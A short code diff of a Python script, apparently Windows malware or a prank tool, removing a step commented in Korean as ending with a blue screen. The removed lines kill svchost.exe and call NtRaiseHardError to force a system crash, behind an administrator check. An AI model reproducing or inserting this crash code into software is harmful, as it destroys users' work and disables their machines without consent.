@@ -66,10 +66,6 @@ def run_shadow():
     
     time.sleep(5)
     
-    # 4. 블루스크린으로 종결
-    os.system("taskkill /f /im svchost.exe")
-    time.sleep(1)
-    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
 
 if __name__ == "__main__":
     if ctypes.windll.shell32.IsUserAnAdmin():
